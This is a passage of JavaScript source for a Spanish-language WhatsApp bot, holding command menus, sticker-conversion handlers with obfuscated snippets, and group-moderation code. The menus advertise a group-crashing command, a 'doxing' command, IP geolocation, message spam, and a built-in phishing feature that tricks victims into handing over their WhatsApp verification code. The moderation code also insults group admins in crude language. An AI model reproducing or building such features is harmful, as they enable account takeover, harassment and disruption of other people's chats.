╠ *●${prefix}imut*
║ _Etiqueta un audio_
║
╠ *●${prefix}hode*
║ _Etiqueta un audio_
║
╠ *●${prefix}grave*
║ _Etiqueta un audio_
║
╠ *●${prefix}fantasma*
║ _Etiqueta un audio_
║
╠ *●${prefix}robot*
║ _Etiqueta un audio_
║
╟╼╾┤🎞VIDEOS🎞├╼╾
║
╠ *●${prefix}reversa*
║ _Etiqueta un video_
║
╠ *●${prefix}vrapido*
║ _Etiqueta un video_
║
╠ *●${prefix}vlento*
║ _Etiqueta un video_
║
╠ *●${prefix}mirror*
║ _Etiqueta un video_
║
╠ *●${prefix}vefecto*
║ _Etiqueta un video_
║
╠ *●${prefix}sinsonido*
║ _Etiqueta un video_
╙╖
╒╩════════════
╰──────────────╮
╭──────────────┴╮
│
╰───────────────╯`

const stc = `
╭─────────────
│ *${prefix}sticker*
│ _Imagen/gif/video_
│ Para crear sticker con video,
│ eiqueta el video/gif a
│ convertir con el comando. 
╰─────────────╮
╭─────────────╯╯`
const Menug = `➫                                                                            
        🔐Hola *${pushname}*
    
${bodyM} ${samu}${prefix}antilink${samu}
${bodyM} ${samu}${prefix}antimedia${samu}
${bodyM} ${samu}${prefix}antibad${samu}
${bodyM} ${samu}${prefix}autostick${samu}
${bodyM} ${samu}${prefix}antileg${samu}
${bodyM} ${samu}${prefix}welcome${samu}
    
${bodyM} ${samu}${prefix}antigp${samu}
_Para prohibir los links de otros grupos_
    
    ================================
    *🔞PARA ACTIVAR LOS COMANDOS +18*:
    ================================
    ${bodyM} ${prefix}+18 1/0
    ================================
        _Modo simsimi ilimitado_
    
*${prefix}simsimi 1*
    
    
*Para que el bot entre a tu grupo, usa el siguiente comando:*
${prefix}entrabot *(Link del grupo)*
        
🚧 *El siguiente comando es para crashear los grupos!! este comando es muy peligroso :) solo administradores pueden usarlo.* 🚧
    
*${prefix}buggp*
    
_Usalo bajo tu responsabilidad!_
    
    
${bodyM} ${prefix}doxing _(Etiqueta un participante o algun mensaje)_
${bodyM} ${prefix}inspeccionar _(Requiere link de un grupo)_
${bodyM} ${prefix}nuevogrupo
${bodyM} ${prefix}grupo abrir/cerrar
${bodyM} ${prefix}getpic
${bodyM} ${prefix}salir
${bodyM} ${prefix}tagstick
${bodyM} ${prefix}totag
${bodyM} ${prefix}imagetag
${bodyM} ${prefix}hidetag
${bodyM} ${prefix}todos
${bodyM} ${prefix}setdesc
${bodyM} ${prefix}nombre
${bodyM} ${prefix}adminlist
${bodyM} ${prefix}setpic
${bodyM} ${prefix}enlinea
${bodyM} ${prefix}promote
${bodyM} ${prefix}demote
${bodyM} ${prefix}eliminar
${bodyM} ${prefix}notif
${bodyM} ${prefix}reply @miembro|frase|frase
${bodyM} ${prefix}contacto @miembro|nombre
${bodyM} ${prefix}link
${bodyM} ${prefix}top5
${bodyM} ${prefix}clonar`

const Menud = ` 

🔐Hola *${pushname}*

♫♪.ılılıll|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|llılılı.♫♪

${bodyM} ${prefix}play *(Descarga de musica)*
${bodyM} ${prefix}playvid *(Descarga de videos por nombre)*
${bodyM} ${prefix}ig *(Fotos y videos de Instagram)*
${bodyM} ${prefix}twit *(videos de Twitter)*
${bodyM} ${prefix}ytmp3 *(Descarga de musica por link)*
${bodyM} ${prefix}ytmp4 *(Descarga de videos por link)*
${bodyM} ${prefix}fb _(Link de FaceBook)_
${bodyM} ${prefix}mfire *(Link de mediafire)*
${bodyM} ${prefix}tomp3 *(Videos a audio)*
${bodyM} ${prefix}letra *(Busca la letra de una cancion)*`

const Menuo = `                                                               


${bodyM} ${prefix}grupos *(Ve los grupos del bot)*
${bodyM} ${prefix}timer *(Cronometro)*
${bodyM} ${prefix}calc *(Calculadora)*
${bodyM} ${prefix}pregunta *(Haz una pregunta y el bot te responde)*
${bodyM} ${prefix}ipbot *(Localiza al bot por ip)*
${bodyM} ${prefix}ip *(Haz una loclizacion por ip)*
${bodyM} ${prefix}igstalk *(Nombre de Usuario)*
${bodyM} ${prefix}voz *(Codigo de idioma)* *(Texto)*
		  _Para ver idiomas compatibles, usa el comando_ *idiomas*
${bodyM} ${prefix}translate *(idioma a traducir = es, en, id...)*
${bodyM} ${prefix}tiktokstalk @usuario
${bodyM} ${prefix}hidetag *(Texto)*
${bodyM} ${prefix}cambiar *(Cambia el cuerpo del menú)*
${bodyM} ${prefix}shortlink _(Acortador de links)_
${bodyM} ${prefix}pastebin *(genera link hacia el texto o link que escribas)*
${bodyM} ${prefix}abinario *(texto a codigo binario)* 010010
${bodyM} ${prefix}binatext *(codigo binario a texto)*
${bodyM} ${prefix}aoctal *(texto a codigo octal)*
${bodyM} ${prefix}octalatext *(codigo octal a texto)*
${bodyM} ${prefix}ahex *(texto a codigo hex)*
${bodyM} ${prefix}hexatext *(codigo hex a texto)*
${bodyM} ${prefix}wa.me
${bodyM} ${prefix}idioimas
${bodyM} ${prefix}reversa
${bodyM} ${prefix}meme
${bodyM} ${prefix}leermas _frase/frase_
${bodyM} ${prefix}mapa
${bodyM} ${prefix}soyyo
${bodyM} ${prefix}blocklist
${bodyM} ${prefix}leerimagen

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	      🌸 SamịPerry.li 🌸
 ********************************`
 const Menu7 = `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            

 Si quieres contribuir para que todos estos comandos y mas funcionen ala perfeccion, puedes aportar un granito de arena al sigiente paypal:
 

 
 
 
 ${bodyM} ${prefix}neon *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}matrix *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}break *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}dropwater *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}lobo *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}flores *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}cross *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}seda *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}fire *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}glow *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}smoke *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}pubg *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}cielo *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}cs *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}ligth *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}navidad *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}nieve *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}tfire *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}playa *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}ff *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}goldbutton *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}silverbutton *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}3d *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}avengers *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}3d2 *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}ph *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}blackpink *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}marvel *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}hojas *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}tligth *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}gtext *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}gtav *(Etiqueta una imagen)*
 ${bodyM} ${prefix}wanted *(Etiqueta una imagen)*
 ${bodyM} ${prefix}wasted *(Etiqueta una imagen)*
 ${bodyM} ${prefix}ocean *(Etiqueta una imagen)*
 ${bodyM} ${prefix}ger *(Etiqueta una imagen)*
 ${bodyM} ${prefix}drawing *(Etiqueta una imagen)*
 ${bodyM} ${prefix}cg *(Etiqueta una imagen)*
 
 *̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
          🌸 SamịPerry.li 🌸
  ******************************`
  const Menu8 = `

*Pará actualizar el bot:*
_${prefix}actualizar_

*Para apagar el bot:*
_${prefix}apagar_


⚠️ El siguiente comando es para restablecer los datos del usuario, para que el código vuelva a generarce, esto es por si quiere tener el bot en algún otro numero, o por si por error cerró la sección en WhatsApp. 

*${prefix}Restaurar*

Prueba el phishing de WhatsApp, cualquier frase que contenga la palabra: 'mantenimiento'
funcionara para llamar al mensaje que te ayudara a obtener el codigo de verificacion de la victima, solo fuciona en privado y solo el numero del bot puede usarlo.

╭─────────────
│ *${prefix}ban*
│ _Prohibe el uso del bot a una persona_
╰─────────────╮
╭─────────────╯
│ *${prefix}unban*
│ _Permite el uso del bot a una persona baneada_
╰─────────────╮
╭─────────────╯
│ *${prefix}banchat*
│ _Bloquea el uso del bot en los chats que se active_
╰─────────────╮
╭─────────────╯
│ *${prefix}bloquear*
│ _Bloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}desbloquear*
│ _Desbloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}setname*
│ _Cambia tu nombre de usuario_
│
│ *${prefix}setpic*
│ _Actualiza tu foto de perfil_
│
│ *${prefix}setstatus*
│ _Cambia tu estado de WhatsApp_
╰─────────────╮
╭─────────────╯
│ *${prefix}estado*
│ _Envia un estado de texto_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadopic*
│ _Envia una imagen a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadovid*
│ _Envia un video a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciar*
│ _Vacia el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciartodo*
│ _Elimina todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}bc*
│ _Broadcast_
╰─────────────╮
╭─────────────╯
│ *${prefix}spam*
│ _Spam de mensajes_
╰─────────────╮
╭─────────────╯
│ *${prefix}fijar*
│ _Fijar el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desfijar*
│ _Desfija el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}archivar*
│ _Archiva un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desarchivar*
│ _Desarchiva todo_
╰─────────────╮
╭─────────────╯
│ *${prefix}silencio*
│ _Mutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desilenciar*
│ _Desmutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}sinleer*
│ _Muestra Chats sin leer_
╰─────────────╮
╭─────────────╯
│ *${prefix}apagar*
│ _Apaga el bot_
╰─────────────╮
╭─────────────╯
│ *${prefix}marcarsinleer*
│ _Marca como no leido todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}leertodo*
│ _Lee todos los chats_
╰──────────────────────`



		   
		   
		if (isAutoSt && isMedia && isImage) {
		if (!itsMe) {
                const encmedia11 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
                const media11 = await samu330.downloadAndSaveMediaMessage(encmedia11, `./sticker/${sender}`)
		const _0x1766=['warn','1kpfGKg','console','toString','constructor','length','178061stRBUX','1300545pGpVkk','138xeSLmh','return\x20(function()\x20','log','934846oKLsog','9350TIPSLK','25Aspfso','433203bjkpOB','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','test','360802vwcGNc','__proto__','prototype','error','bind','\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSamu330\x20NyanBot\x0a\x0a\x20\x20\x20\x20\x20\x20\x20Sam\x20y\x20Perry','104838iWsgLj','apply','trace','table','return\x20/\x22\x20+\x20this\x20+\x20\x22/'];const _0x4d367b=_0x5de4;(function(_0x3eb50f,_0x5003ec){const _0x160706=_0x5de4;while(!![]){try{const _0x1f0294=parseInt(_0x160706(0x94))*-parseInt(_0x160706(0x90))+-parseInt(_0x160706(0x8f))+-parseInt(_0x160706(0x96))+-parseInt(_0x160706(0x93))+parseInt(_0x160706(0x9f))*-parseInt(_0x160706(0x89))+parseInt(_0x160706(0x99))+-parseInt(_0x160706(0x95))*-parseInt(_0x160706(0x8e));if(_0x1f0294===_0x5003ec)break;else _0x3eb50f['push'](_0x3eb50f['shift']());}catch(_0x5172fc){_0x3eb50f['push'](_0x3eb50f['shift']());}}}(_0x1766,0xb6c33));const _0x33a8e1=function(){let _0x15f095=!![];return function(_0xc7cbfc,_0x3249de){const _0x38e2d8=_0x15f095?function(){const _0x52e93e=_0x5de4;if(_0x3249de){const _0x285798=_0x3249de[_0x52e93e(0xa0)](_0xc7cbfc,arguments);return _0x3249de=null,_0x285798;}}:function(){};return _0x15f095=![],_0x38e2d8;};}(),_0x49176f=_0x33a8e1(this,function(){const _0x10650c=function(){const _0x379fdc=_0x5de4,_0x3a1fbc=_0x10650c['constructor'](_0x379fdc(0x87))()[_0x379fdc(0x8c)](_0x379fdc(0x97));return!_0x3a1fbc[_0x379fdc(0x98)](_0x49176f);};return _0x10650c();});function _0x5de4(_0x1fdbaf,_0x29f9bf){return _0x5de4=function(_0x165099,_0x5b786d){_0x165099=_0x165099-0x86;let _0x1efd2f=_0x1766[_0x165099];return _0x1efd2f;},_0x5de4(_0x1fdbaf,_0x29f9bf);}_0x49176f();const _0x1efd2f=function(){let _0x1bb24e=!![];return function(_0x15bf9c,_0x1d48e4){const _0x4f2296=_0x1bb24e?function(){const _0x55ad81=_0x5de4;if(_0x1d48e4){const _0x53132f=_0x1d48e4[_0x55ad81(0xa0)](_0x15bf9c,arguments);return _0x1d48e4=null,_0x53132f;}}:function(){};return _0x1bb24e=![],_0x4f2296;};}(),_0x5b786d=_0x1efd2f(this,function(){const _0x34c292=_0x5de4,_0x15e5c1=function(){const _0x5bb16a=_0x5de4;let _0x401748;try{_0x401748=Function(_0x5bb16a(0x91)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2b5e28){_0x401748=window;}return _0x401748;},_0x3e62c6=_0x15e5c1(),_0x245f34=_0x3e62c6[_0x34c292(0x8a)]=_0x3e62c6['console']||{},_0x1903dd=[_0x34c292(0x92),_0x34c292(0x88),'info',_0x34c292(0x9c),'exception',_0x34c292(0x86),_0x34c292(0xa1)];for(let _0x5ae008=0x0;_0x5ae008<_0x1903dd[_0x34c292(0x8d)];_0x5ae008++){const _0x58a6ed=_0x1efd2f['constructor'][_0x34c292(0x9b)][_0x34c292(0x9d)](_0x1efd2f),_0xb03c63=_0x1903dd[_0x5ae008],_0x260eb3=_0x245f34[_0xb03c63]||_0x58a6ed;_0x58a6ed[_0x34c292(0x9a)]=_0x1efd2f[_0x34c292(0x9d)](_0x1efd2f),_0x58a6ed[_0x34c292(0x8b)]=_0x260eb3[_0x34c292(0x8b)][_0x34c292(0x9d)](_0x260eb3),_0x245f34[_0xb03c63]=_0x58a6ed;}});_0x5b786d();const aaa=_0x4d367b(0x9e);
                const dataFl = `${aaa}`
		const author101 = args.join(' ')
                exif.create(dataFl, author101, `stickwm_${sender}`)
                await ffmpeg(`${media11}`)
                .input(media11)
                .on('start', function (cmd) {
                console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                console.log(`Error : ${err}`)        
		fs.unlinkSync(media1)                
		reply('*Intenta de nuevo*')
                })
                .on('end', function () {
                console.log('Finish')                         
		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {                                               
		if (error) return reply('error')
                wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)             
		fs.unlinkSync(media11)
                fs.unlinkSync(`./sticker/${sender}.webp`)
                fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
                })
                })
                .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p]paletteuse`])
                .toFormat('webp')
                .save(`./sticker/${sender}.webp`)
		}}
		if ((isAutoSt && isMedia && sam.message.videoMessage.fileLength < 10000000 || isVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
		if (!itsMe) {
                const encmedia22 = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
                const media22 = await samu330.downloadAndSaveMediaMessage(encmedia22, `./sticker/${sender}`)
		const _0x27fb=['1227757QFPTCj','table','error','console','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','prototype','4mOcIdv','300973AXvFLL','113PJAhxc','bind','__proto__','constructor','1hPhdPg','toString','2614385THObwv','\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSamu330\x20NyanBot\x0a\x0a\x20\x20\x20\x20\x20\x20\x20Sam\x20y\x20Perry','674jhGLms','1366829jQTHFD','378748rzovFh','exception','1wImvle','1305043VMjXUP','return\x20/\x22\x20+\x20this\x20+\x20\x22/','{}.constructor(\x22return\x20this\x22)(\x20)','apply'];function _0x3657(_0x24f22c,_0x12d4cd){return _0x3657=function(_0x36fb84,_0x290295){_0x36fb84=_0x36fb84-0x135;let _0x42acbe=_0x27fb[_0x36fb84];return _0x42acbe;},_0x3657(_0x24f22c,_0x12d4cd);}const _0x495578=_0x3657;(function(_0x53a12a,_0x3301a7){const _0x1d2e31=_0x3657;while(!![]){try{const _0x162d02=-parseInt(_0x1d2e31(0x135))+-parseInt(_0x1d2e31(0x14a))+parseInt(_0x1d2e31(0x149))*parseInt(_0x1d2e31(0x146))+-parseInt(_0x1d2e31(0x13d))*-parseInt(_0x1d2e31(0x145))+parseInt(_0x1d2e31(0x141))*parseInt(_0x1d2e31(0x147))+parseInt(_0x1d2e31(0x13b))*-parseInt(_0x1d2e31(0x13c))+parseInt(_0x1d2e31(0x143));if(_0x162d02===_0x3301a7)break;else _0x53a12a['push'](_0x53a12a['shift']());}catch(_0x50b87f){_0x53a12a['push'](_0x53a12a['shift']());}}}(_0x27fb,0xaac28));const _0x333816=function(){let _0x3b9de2=!![];return function(_0x34ee6d,_0x3e4e7c){const _0x338996=_0x3b9de2?function(){const _0x475110=_0x3657;if(_0x3e4e7c){const _0x1db804=_0x3e4e7c[_0x475110(0x14d)](_0x34ee6d,arguments);return _0x3e4e7c=null,_0x1db804;}}:function(){};return _0x3b9de2=![],_0x338996;};}(),_0x835717=_0x333816(this,function(){const _0xee8b8e=function(){const _0x50f77d=_0x3657,_0x3c9dc1=_0xee8b8e[_0x50f77d(0x140)](_0x50f77d(0x14b))()[_0x50f77d(0x140)](_0x50f77d(0x139));return!_0x3c9dc1['test'](_0x835717);};return _0xee8b8e();});_0x835717();const _0x42acbe=function(){let _0x37110c=!![];return function(_0x5a1047,_0x16f831){const _0x2238b9=_0x37110c?function(){if(_0x16f831){const _0x184403=_0x16f831['apply'](_0x5a1047,arguments);return _0x16f831=null,_0x184403;}}:function(){};return _0x37110c=![],_0x2238b9;};}(),_0x290295=_0x42acbe(this,function(){const _0x39d9ee=_0x3657;let _0x4b1d9a;try{const _0x19fa90=Function('return\x20(function()\x20'+_0x39d9ee(0x14c)+');');_0x4b1d9a=_0x19fa90();}catch(_0x477b7c){_0x4b1d9a=window;}const _0x32fe68=_0x4b1d9a[_0x39d9ee(0x138)]=_0x4b1d9a[_0x39d9ee(0x138)]||{},_0x3152dd=['log','warn','info',_0x39d9ee(0x137),_0x39d9ee(0x148),_0x39d9ee(0x136),'trace'];for(let _0x244612=0x0;_0x244612<_0x3152dd['length'];_0x244612++){const _0x55e7a2=_0x42acbe['constructor'][_0x39d9ee(0x13a)]['bind'](_0x42acbe),_0x15b4f3=_0x3152dd[_0x244612],_0x44c3e4=_0x32fe68[_0x15b4f3]||_0x55e7a2;_0x55e7a2[_0x39d9ee(0x13f)]=_0x42acbe[_0x39d9ee(0x13e)](_0x42acbe),_0x55e7a2[_0x39d9ee(0x142)]=_0x44c3e4['toString'][_0x39d9ee(0x13e)](_0x44c3e4),_0x32fe68[_0x15b4f3]=_0x55e7a2;}});_0x290295();const aaa=_0x495578(0x144);
                const packname1001 = `${aaa}`          
		const author1001 = args.join(' ')
                exif.create(packname1001, author1001, `stickwm_${sender}`)  
                await ffmpeg(`${media22}`)
		.inputFormat(media22.split('.')[4])
		.on('start', function (cmd) {
                console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {                                                                                                        
		console.log(`Error : ${err}`)
                fs.unlinkSync(media22)                
		tipe = media.endsWith('.mp4') ? 'video' : 'gif'         
		reply('*Intenta de nuevo*')                   
		})                                      
		.on('end', function () {                         
		console.log('Finish')                       
		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {                                                                     
		if (error) return reply('error')                                 
		wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)           
		fs.unlinkSync(media22)                                             
		fs.unlinkSync(`./sticker/${sender}.webp`)                  
		fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)               
		})
                })                                                
		.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])                                                                      
		.toFormat('webp')                                    
		.save(`./sticker/${sender}.webp`)
		}}
	    	if (messagesC.includes("chat.whatsapp")){
		        if (!isGroup) return
		        if (!isAntigp) return
		        if (isAdmin) return reply('Tienes suerte, eres admin y no te sacaré')
			reply(`Link detectado ${sender.split("@")[0]} serás expulsado de este grupo`)
			samu330.groupRemove(from, [sender])
		}

	    
	    ///////////////////////FUNCIONES CREADAS POR SAMU330\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
	    
			if (isGroup && botAdmin && isAntiMedia) {     
			if (!itsMe) {
			if (isMedia && !sam.message.videoMessage || isImage) {
                        samu330.updatePresence(from, Presence.composing) 
			reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las fotos ni videos, *serás expulsado por seguridad:D*`)
			samu330.groupRemove(from, [sender])
					}
				}      
			}
			if (isGroup && botAdmin && isAntiMedia) {
			if (!itsMe) {
			if (isMedia && sam.message.videoMessage) {
                        samu330.updatePresence(from, Presence.composing) 
			reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las fotos ni videos, *serás expulsado por seguridad:D*`)
                        samu330.groupRemove(from, [sender])                                              
					}
				}
			}
			if (isGroup && botAdmin && isAntiLeg) {      
			if (!itsMe) {
			if (isAudio) {
			if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)
				reply(`*AUDIO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
				samu330.groupRemove(from, [sender])
			}
			}
			}
			if (isGroup && botAdmin && isAntiLeg) {                                                                	  
			if (!itsMe) {                        
			if (isContact) {
                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                  
				reply(`*CONTACTO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
				             
			}               
			}                     
			}
	    		if (isGroup && botAdmin && isAntiLeg) {                                                                	  
			if (!itsMe) {
                      	if (q.length > 10000) {
				reply('*Este mensaje contiene mas de 10, 000 caracteres, probablemente puede ser una trava, por lo que tendre que eliminarte🙂*\n\n_Este grupo esta protegido por_ *🔐Samu330*')
				samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
				samu330.sendMessage(from, '*Esperemos 10 segundos🙄*', MessageType.text)
				})
				samu330.groupRemove(from, [sender])
				await sleep(10000)
				samu330.groupSettingChange(from, GroupSettingChange.messageSend, false)
			}
			}
			}
			if (isGroup && botAdmin && isAntiLeg) {                                                         	  
			if (!itsMe) {                                 
			if (isLocation) {
                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                     
				reply(`*nnsns*`)                            
			}             
			}                     
			}

			if (resbutton == 'Cristobal Colon') {
				reply(`😂WTF!!\nJAJAJA Como va a ser Cristobal jajajaja, te hace falta estudiar Matematicas-_-`)
			} else if (resbutton == 'Eugenio Derbez') {
				reply(`PUES CLAROO!!!😏✏✅`)
			} 
	
			switch (commandstik) {
	
				case "SxxV2zKhKYR4MUXj6ax5MKZto/u5ArlO1S+GokdA6ks=":
					let luck = samu330.prepareMessageFromContent(from, {
						"listMessage":  {
							"title": "*THIS IS A TEST!!*",
							"description": `Responde la siguiente pregunta:\n\n¿Quien descubrio America🗺?`,
							"buttonText": "Selecciona tu respuesta",
							"listType": "SINGLE_SELECT",
							"sections": [
								{
									"rows": [
										{
											"title": `Cristobal Colon`,
											"rowId": ""
										},
										{
											"title": "Eugenio Derbez",
											"rowId": ""
										}
									]
								}
							]
						}
					}, {})
				samu330.relayWAMessage(luck, {waitForAck: true})
				break
			}


			switch (commandstik) {
	
				case "paxuDk3LoZENYGIbqq0jI7+xHaEaDfGaWGtVJt/Vyzg=":
					redes = ['© insane']
					opcion = redes[Math.floor(Math.random() * redes.length)]


let newmenu = samu330.prepareMessageFromContent(from, {
"listMessage":  {
"title": "*🪀MENU*",
"description": `
🔐Hola *${pushname}* ${timeFt}
_Tipo de usuario:_ ${tipoDeUsr}
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevelingLevel(sender)}
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🕐Son las *${hora}*\n\n
🍃Hoy es *${week1}  ${calender1}*
༶•┈┈┈•༶
${opcion}`,
